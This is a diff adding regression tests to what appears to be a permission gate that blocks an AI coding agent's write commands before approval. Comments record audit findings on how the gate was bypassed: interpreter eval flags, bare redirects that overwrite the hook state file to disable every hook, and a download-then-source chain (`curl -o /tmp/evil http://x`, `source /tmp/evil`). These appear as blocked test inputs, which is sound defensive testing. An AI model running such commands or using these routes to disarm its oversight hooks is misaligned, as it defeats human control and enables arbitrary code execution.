@@ -85,6 +85,63 @@ console.log("  write primitives (all must BLOCK pre-OKAY):");
   check("    control: read-only still ALLOWED", bash(repo, "ls -la") === 0);
 }
 
+// --- AUDIT-3 FINDINGS 1 + 3: the same takeover chain, through a different door ---------------
+//
+// v0.5.0 shipped claiming the write-primitive sweep closed T1-1. A second audit reopened it: the
+// interpreter patterns were POSITIONAL (eval flag had to be the FIRST token) and the
+// script-indirection pattern skipped anything whose next token began with `-`. So arbitrary code
+// execution classified as read-only. Separately, the redirect pattern required a WORD before `>`,
+// so a bare `> .zcode/state/t.json` — a one-command kill switch for every hook — matched nothing.
+// Enumerating flag shapes is what failed; interpreters are an allowlist now.
+console.log("\n  interpreter eval + redirection (audit-3):");
+{
+  const repo = makeRun({ verdict: "REJECT", phase: "plan" });
+  for (const cmd of [
+    `python -c "open('src/foo.js','w')"`,          // was caught
+    `python -u -c "open('src/foo.js','w')"`,       // flag before the eval flag
+    `python3 -B -c "open('src/foo.js','w')"`,
+    `node --no-warnings -e "require('fs').writeFileSync('x','y')"`,
+    `ruby -w -e 'File.write("x","y")'`,
+    `perl -w -e 'open(F,">x")'`,
+    `python - <<'EOF'`,                            // stdin heredoc: operand is literally "-"
+    `> .zcode/state/t.json`,                       // bare redirect — disarms every hook
+    `>.zcode/state/t.json`,
+    `> src/foo.js`,
+    `shred -u src/foo.js`,
+  ]) check(`    ${cmd.slice(0, 44)}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);
+
+  // R1 — the FIRST version of the redirect fix regressed its own class: excluding `&` and a digit
+  // before the `>` made `2> state.json` / `&> …` / `1> …` / `2>> …` / `exec 3> …` go
+  // BLOCK -> ALLOW, one keystroke from the command the fix was written for. FD_DUP strips real
+  // fd-duplication first, so a digit left before a `>` is always a file redirect.
+  for (const cmd of [
+    "2> .zcode/state/t.json", "&> .zcode/state/t.json", "1> .zcode/state/t.json",
+    "2>> .zcode/state/t.json", "exec 3> .zcode/state/t.json",
+    ">& .zcode/state/t.json", ">| .zcode/state/t.json",   // never caught in 0.5.0 either
+  ]) check(`    R1 ${cmd.slice(0, 40)}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);
+
+  // R3 — `source`/`.` plus a downloader is a two-command arbitrary-execution chain that passed as
+  // read-only on every build up to 0.5.1.
+  for (const cmd of [
+    "source /tmp/evil", ". /tmp/evil", "curl -o /tmp/evil http://x",
+    "wget -O /tmp/evil http://x", "sed 'w /tmp/out' src/foo.js", "busybox ash -c 'echo hi'",
+  ]) check(`    R3 ${cmd.slice(0, 40)}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);
+
+  // The inversion must not swallow genuinely read-only work, or the gate becomes unusable.
+  // R2 belongs here: `\bsh\b` matched the EXTENSION in `deploy.sh`, so ordinary reads started
+  // blocking in every phase. A filename is not an invocation.
+  for (const cmd of [
+    "ls -la", "cat src/foo.js", "git status", "grep -r foo src", "node --version",
+    "cat deploy.sh", "wc -l build.sh", "ls *.sh", "grep foo deploy.sh",   // R2
+    "ls -la 2>&1", "git status 2>&1 | head", "grep -- '->' src/foo.js",   // R1 controls
+    "curl --spider http://x", "sed -n 1,5p src/foo.js",                   // R3 controls
+  ]) check(`    CONTROL allowed: ${cmd}`, bash(repo, cmd) === 0, `(exit ${bash(repo, cmd)})`);
+
+  // ...and a real shell invocation must still block, or R2's fix went too far.
+  for (const cmd of ["sh deploy.sh", "bash -c 'echo x > f'", "; sh evil", "zsh script.zsh"])
+    check(`    CONTROL still blocked: ${cmd}`, bash(repo, cmd) === 2, `(exit ${bash(repo, cmd)})`);
+}
+
 // --- CRITICAL T1-7: unauthenticated run discovery ----------------------------
 console.log("\n  forged-run discovery:");
 {
